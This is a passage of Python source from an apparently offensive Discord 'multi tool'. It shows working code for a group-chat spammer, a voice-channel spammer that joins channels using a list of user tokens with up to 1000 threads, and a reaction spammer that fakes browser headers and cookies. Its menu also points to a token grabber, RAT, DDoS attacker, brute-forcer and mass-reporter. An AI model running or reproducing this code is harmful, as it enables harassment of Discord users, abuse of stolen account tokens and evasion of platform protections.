░▒   ▒ ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ ▒▓▒░ ░  ░    ▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░▒▒   ▓▒█░ ▒░   ░  ░░ ▒░   ░  ░░░░ ▒░ ░ ▒▓ ░▒▓░
 ░   ░   ░▒ ░ ▒   ░ ▒ ▒░ ░░▒░ ░ ░ ░▒ ░         ░ ░▒  ░ ░░▒ ░     ░ ░   ▒▒ ░  ░      ░░  ░      ░░ ░ ░    ░▒ ░ ▒ 
 ░   ░   ░░   ░ ░ ░ ░ ▒   ░░░ ░ ░ ░░           ░  ░  ░  ░░         ░   ▒  ░      ░   ░      ░       ░    ░░   ░ 
     ░    ░         ░ ░     ░                        ░                 ░         ░          ░   ░   ░     ░     

        """)
    token = input(f"""{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}Token: """)
    UserID = input(f"""{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}User ID: """)
    group = input(f"""{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}Group Names: """)
    manygr = int(input(f"""{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}How Many Groups: """))
    headers = mainHeader(token)
    for i in range(manygr):
        try:
            r = requests.post('https://discord.com/api/v9/users/@me/channels', headers=headers,
                              json={"recipients": []})
            jsr = json.loads(r.content)
            groupID = jsr['id']
            time.sleep(0.5)
            r1 = requests.patch(f'https://discord.com/api/v9/channels/{groupID}', headers=headers,
                                json={'name': group})
            if r1.status_code == 200:
                print(f'{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}Group created')
            with open("data/groups.txt", "w") as groupID:
                groupID.write(jsr['id'] + '\n')
        except:
            print(f'{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}RateLimited for {jsr["retry_after"]} seconds'), time.sleep(jsr['retry_after'])
        scrIds = random.choice(open('data/groups.txt').readlines())
        grID = scrIds.strip('\n')
        r2 = requests.put(f'https://discord.com/api/v9/channels/{grID}/recipients/{UserID}',
                          headers={'Authorization': token})
        if r2.status_code == 204:
            print(f'{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}Group Members: {UserID}')
    time.sleep(1)
    exit = input(f'''
Press ENTER to continue... ''')
    exit = clear()
    exit = tool()

  global option2
  def option2():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Eclipse Multi Tools | Made by ShredGman™")
    print(fade.fire(BANNER))
    print(f'''                                                                                                             Tokens: {Fore.LIGHTRED_EX}[{Fore.YELLOW}{counttokens}{Fore.LIGHTRED_EX}]''')
    print(Fore.RED + '                 ')
    print(Fore.RED +f'                 ╔══════════════════════════════╦══════════════════════════╦══════════════════════════════╗')
    print(Fore.RED + '                 ║                              ║                          ║                              ║')
    print(Fore.RED +f'                 ║     [{Fore.YELLOW}28{Fore.RED}] {Fore.YELLOW}VC SPAMMER{Fore.RED}          ║     {Fore.RED}({Fore.YELLOW}N{Fore.RED}/{Fore.YELLOW}A{Fore.RED})                ║     {Fore.RED}({Fore.YELLOW}N{Fore.RED}/{Fore.YELLOW}A{Fore.RED})                    ║')
    print(Fore.RED +f'                 ║     [{Fore.YELLOW}29{Fore.RED}] {Fore.YELLOW}SERVER LOOKUP{Fore.RED}       ║     {Fore.RED}({Fore.YELLOW}N{Fore.RED}/{Fore.YELLOW}A{Fore.RED})                ║     {Fore.RED}({Fore.YELLOW}N{Fore.RED}/{Fore.YELLOW}A{Fore.RED})                    ║')
    print(Fore.RED +f'                 ║     [{Fore.YELLOW}30{Fore.RED}] {Fore.YELLOW}REACTION SPAMMER{Fore.RED}    ║     {Fore.RED}({Fore.YELLOW}N{Fore.RED}/{Fore.YELLOW}A{Fore.RED})                ║     {Fore.RED}({Fore.YELLOW}N{Fore.RED}/{Fore.YELLOW}A{Fore.RED})                    ║')
    print(Fore.RED +f'                 ║     ({Fore.YELLOW}N{Fore.RED}/{Fore.YELLOW}A{Fore.RED})                    ║     {Fore.RED}({Fore.YELLOW}N{Fore.RED}/{Fore.YELLOW}A{Fore.RED})                ║     {Fore.RED}({Fore.YELLOW}N{Fore.RED}/{Fore.YELLOW}A{Fore.RED})                    ║')
    print(Fore.RED +f'                 ║     ({Fore.YELLOW}N{Fore.RED}/{Fore.YELLOW}A{Fore.RED})                    ║     {Fore.RED}({Fore.YELLOW}N{Fore.RED}/{Fore.YELLOW}A{Fore.RED})                ║     {Fore.RED}({Fore.YELLOW}N{Fore.RED}/{Fore.YELLOW}A{Fore.RED})                    ║')
    print(Fore.RED +f'                 ║     ({Fore.YELLOW}N{Fore.RED}/{Fore.YELLOW}A{Fore.RED})                    ║     {Fore.RED}({Fore.YELLOW}N{Fore.RED}/{Fore.YELLOW}A{Fore.RED})                ║     {Fore.RED}({Fore.YELLOW}N{Fore.RED}/{Fore.YELLOW}A{Fore.RED})                    ║')
    print(Fore.RED +f'                 ║     ({Fore.YELLOW}N{Fore.RED}/{Fore.YELLOW}A{Fore.RED})                    ║     {Fore.RED}({Fore.YELLOW}N{Fore.RED}/{Fore.YELLOW}A{Fore.RED})                ║     {Fore.RED}({Fore.YELLOW}N{Fore.RED}/{Fore.YELLOW}A{Fore.RED})                    ║')
    print(Fore.RED +f'                 ║     ({Fore.YELLOW}N{Fore.RED}/{Fore.YELLOW}A{Fore.RED})                    ║     {Fore.RED}({Fore.YELLOW}N{Fore.RED}/{Fore.YELLOW}A{Fore.RED})                ║     {Fore.RED}({Fore.YELLOW}N{Fore.RED}/{Fore.YELLOW}A{Fore.RED})                    ║')
    print(Fore.RED +f'                 ║     ({Fore.YELLOW}N{Fore.RED}/{Fore.YELLOW}A{Fore.RED})                    ║     {Fore.RED}({Fore.YELLOW}N{Fore.RED}/{Fore.YELLOW}A{Fore.RED})                ║     {Fore.RED}({Fore.YELLOW}N{Fore.RED}/{Fore.YELLOW}A{Fore.RED})                    ║')
    print(Fore.RED + '                 ║                              ║                          ║                              ║')
    print(Fore.RED + '                 ╚══════════════════════════════╩══════════════════════════╩══════════════════════════════╝')
    print(Fore.RED +f'                                                                                          {Fore.RED}[{Fore.YELLOW}<{Fore.RED}] {Fore.YELLOW}PREVIOUS PAGE')
    print(Fore.RED + '')
    print(f'  {Fore.YELLOW}┌──<{user_name}{Fore.RED}@{Fore.YELLOW}Eclipse>─{Fore.RED}[{Fore.YELLOW}+{Fore.RED}]')
    global options
    option2 = input(f'  {Fore.YELLOW}└───{Fore.RED}➤{Fore.YELLOW} ')


    if option2 in ['28']:
      ctypes.windll.kernel32.SetConsoleTitleW("Eclipse Multi Tools | VoiceChat Spammer")
      cls()
      print(f"""
  {Fore.RED}
   ▄████  ██▀███   ▒█████   █    ██  ██▓███        ██████  ██▓███   ▄▄▄      ███▄ ▄███▓ ███▄ ▄███▓ ▓█████ ██▀███  
   ██▒ ▀█▓██ ▒ ██▒▒██▒  ██▒ ██  ▓██▒▓██░  ██     ▒██    ▒ ▓██░  ██ ▒████▄   ▓██▒▀█▀ ██▒▓██▒▀█▀ ██▒ ▓█   ▀▓██ ▒ ██▒
  ▒██░▄▄▄▓██ ░▄█ ▒▒██░  ██▒▓██  ▒██░▓██░ ██▓▒    ░ ▓██▄   ▓██░ ██▓▒▒██  ▀█▄ ▓██    ▓██░▓██    ▓██░ ▒███  ▓██ ░▄█ ▒
  ░▓█  ██▒██▀▀█▄  ▒██   ██░▓▓█  ░██░▒██▄█▓▒ ▒      ▒   ██▒▒██▄█▓▒ ▒░██▄▄▄▄██▒██    ▒██ ▒██    ▒██  ▒▓█  ▄▒██▀▀█▄  
  ▒▓███▀▒░██▓ ▒██▒░ ████▓▒░▒▒█████▓ ▒██▒ ░  ░    ▒██████▒▒▒██▒ ░  ░▒▓█   ▓██▒██▒   ░██▒▒██▒   ░██▒▒░▒████░██▓ ▒██▒
  ░▒   ▒ ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ ▒▓▒░ ░  ░    ▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░▒▒   ▓▒█░ ▒░   ░  ░░ ▒░   ░  ░░░░ ▒░ ░ ▒▓ ░▒▓░
   ░   ░   ░▒ ░ ▒   ░ ▒ ▒░ ░░▒░ ░ ░ ░▒ ░         ░ ░▒  ░ ░░▒ ░     ░ ░   ▒▒ ░  ░      ░░  ░      ░░ ░ ░    ░▒ ░ ▒ 
   ░   ░   ░░   ░ ░ ░ ░ ▒   ░░░ ░ ░ ░░           ░  ░  ░  ░░         ░   ▒  ░      ░   ░      ░       ░    ░░   ░ 
       ░    ░         ░ ░     ░                        ░                 ░         ░          ░   ░   ░     ░     
  
          """)    
      tokenlist = open("tokens.txt", "r").read().splitlines()
      channel = input(f"""{Fore.RED}[{Fore.YELLOW}+{Fore.RED}]{Fore.YELLOW} Voice Channel ID: """)
      server = input(f"""{Fore.RED}[{Fore.YELLOW}+{Fore.RED}]{Fore.YELLOW} Server ID: """)
      deaf = input(f"""{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}Defean: (y/n) """)
      if deaf == "y":
        deaf = True
        if deaf == "n":
          deaf = False
      mute = input(f"""{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}Mute: (y/n) """)
      if mute == "y":
        mute = True
        if mute == "n":
          mute = False
      stream = input(f"""{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}Stream: (y/n) """)
      if stream == "y":
        stream = True
        if stream == "n":
          stream = False
      video = input(f"""{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}Video: (y/n) """)
      if video == "y":
        video = True
        if video == "n":
          video = False
  
      executor = ThreadPoolExecutor(max_workers=int(1000))
      def run(token):
        while True:
          ws = WebSocket()
          ws.connect("wss://gateway.discord.gg/?v=8&encoding=json")
          hello = loads(ws.recv())
          heartbeat_interval = hello['d']['heartbeat_interval']
          ws.send(dumps({"op": 2,"d": {"token": token,"properties": {"$os": "windows","$browser": "Discord","$device": "desktop"}}}))
          ws.send(dumps({"op": 4,"d": {"guild_id": server,"channel_id": channel,"self_mute": mute,"self_deaf": deaf, "self_stream?": stream, "self_video": video}}))
          ws.send(dumps({"op": 18,"d": {"type": "guild","guild_id": server,"channel_id": channel,"preferred_region": "singapore"}}))
          ws.send(dumps({"op": 1,"d": None}))
          sleep(0.1)
  
      i = 0
  
      for token in tokenlist:
        executor.submit(run, token)
        i+=1
        print(f"""{Fore.YELLOW}[{Fore.YELLOW}-{Fore.YELLOW}] {Fore.YELLOW}Joined VC""")
        sleep(0.01)
      yay = input(f"""{Fore.RED}[{Fore.YELLOW}!{Fore.RED}] {Fore.YELLOW}Press ENTER to Stop VC Spammer!""")

    elif option2 in ['29']:
      ctypes.windll.kernel32.SetConsoleTitleW("Eclipse Multi Tools | Server Lookup")
      subprocess.call(["python", "utilities/Plugins/Server_Lookup.py"])

    elif option2 in ['30']:
      ctypes.windll.kernel32.SetConsoleTitleW("Eclipse Multi Tools | Reaction Spammer")
      cls()
      print(f"""
  {Fore.RED}
   ██▀███   ▓█████ ▄▄▄       ▄████▄ ▄▄▄█████▓  ██▓ ▒█████   ███▄    █     
  ▓██ ▒ ██▒ ▓█   ▀▒████▄    ▒██▀ ▀█ ▓  ██▒ ▓▒▒▓██▒▒██▒  ██▒ ██ ▀█   █     
  ▓██ ░▄█ ▒ ▒███  ▒██  ▀█▄  ▒▓█    ▄▒ ▓██░ ▒░▒▒██▒▒██░  ██▒▓██  ▀█ ██▒    
  ▒██▀▀█▄   ▒▓█  ▄░██▄▄▄▄██▒▒▓▓▄ ▄██░ ▓██▓ ░ ░░██░▒██   ██░▓██▒  ▐▌██▒    
  ░██▓ ▒██▒▒░▒████▒▓█   ▓██░▒ ▓███▀   ▒██▒ ░ ░░██░░ ████▓▒░▒██░   ▓██░    
  ░ ▒▓ ░▒▓░░░░ ▒░ ░▒▒   ▓▒█░░ ░▒ ▒    ▒ ░░    ░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒     
    ░▒ ░ ▒ ░ ░ ░  ░ ░   ▒▒    ░  ▒      ░    ░ ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░    
    ░░   ░     ░    ░   ▒   ░         ░      ░ ▒ ░░ ░ ░ ▒     ░   ░ ░     
     ░     ░   ░        ░   ░ ░                ░      ░ ░           ░     

  """)
      def reaction(chd, iddd, org, token):
          headers = {'Content-Type': 'application/json',
                     'Accept': '*/*',
                     'Accept-Encoding': 'gzip, deflate, br',
                     'Accept-Language': 'en-US',
                     'Cookie': f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                     'DNT': '1',
                     'origin': 'https://discord.com',
                     "sec-fetch-dest": "empty",
                     "sec-fetch-mode": "cors",
                     "sec-fetch-site": "same-origin",
                     'TE': 'Trailers',
                     'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9',
                     'authorization': token,
                     'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
                     }
      
          emoji = ej.emojize(org, use_aliases=True)
          a = requests.put(
              f"https://discordapp.com/api/v9/channels/{chd}/messages/{iddd}/reactions/{emoji}/@me",
              headers=headers)
          if a.status_code == 204:
              print(f"{Fore.RED}[{Fore.YELLOW}>{Fore.RED}] {Fore.YELLOW}Reaction {org}")
          else:
              print(f"{Fore.RED}[{Fore.YELLOW}!{Fore.RED}] {Fore.YELLOW}Error")
      
      tokens = open('tokens.txt', 'r').read().splitlines()
      chd = input(f"""{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}Channel ID: """)
      iddd = input(f"""{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}Message ID: """)
      emoji = input(f"""{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}Emoji: """)
      delay = int(input(f"""{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}Delay: """))
      for token in tokens:
          time.sleep(delay)
          threading.Thread(target=reaction, args=(chd, iddd, emoji, token)).start()
      
      time.sleep(1)
      exit = input(f'press any key to continue...')
      exit = clear()
      exit = spammer()

    elif option2 in ['<']:
      tool()
      return
    
    else:
      print("Error, Invalid Option")


    while __name__ == '__main__' and option2 not in ['<']:
      print(Fore.YELLOW)
      os.system('pause')
      tool()

  if options in ['1','01']:
    tokennuker()
  elif options in ['2','02']:
    webhooks()
  elif options in ['3','03']:
    leaver()
  elif options in ['4','04']:
    onliner()
  elif options in ['5','05']:
    joiner()
  elif options in ['6','06']:
    nuker()
  elif options in ['07','7']:
    tokenspammer()
  elif options in ['08','8']:
    friends()
  elif options in ['09','9']:
    groupchatspammer()
  elif options in ['10']:
    tokengen()
  elif options in ['11']:
    nitro()
  elif options in ['12']:
    proxyscrape()
  elif options in ['13']:
    grabber()
  elif options in ['14']:
    qrcode()    
  elif options in ['15']:
    discordrat()
  elif options in ['16']:
    scraper()
  elif options in ['17']:
    namegen()
  elif options in ['18']:
    subprocess.call(["python", "utilities/Plugins/DdosAttacker.py"])
  elif options in ['19']:
    bruteforce()
  elif options in ['20']:
    checker()
  elif options in ['21']:
    login()
  elif options in ['22']:
    subprocess.call(["python", "utilities/Plugins/tokeninfo.py"])
  elif options in ['23']:
    pfpmanager()
  elif options in ['24']:
    hypesquad()
  elif options in ['25']:
    biochanger()
  elif options in ['26']:
    idtotoken()
  elif options in ['27']:
    massreport()
  elif options in ['00','0']:
    exit()
  elif options in ['TM','tm']:
    discordserver()
  elif options in ['!']:
    settings()
  elif options in ['UPD','upd']:
    search_for_updates()
  elif options in ['>']:
    option2()
  else:
    print("Error, Invalid Option")



tool()
while __name__ == '__main__':
    print(Fore.YELLOW)
    os.system('pause')
    subprocess.run(['python', 'utilities/Plugins/build.py'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)	
    tool()
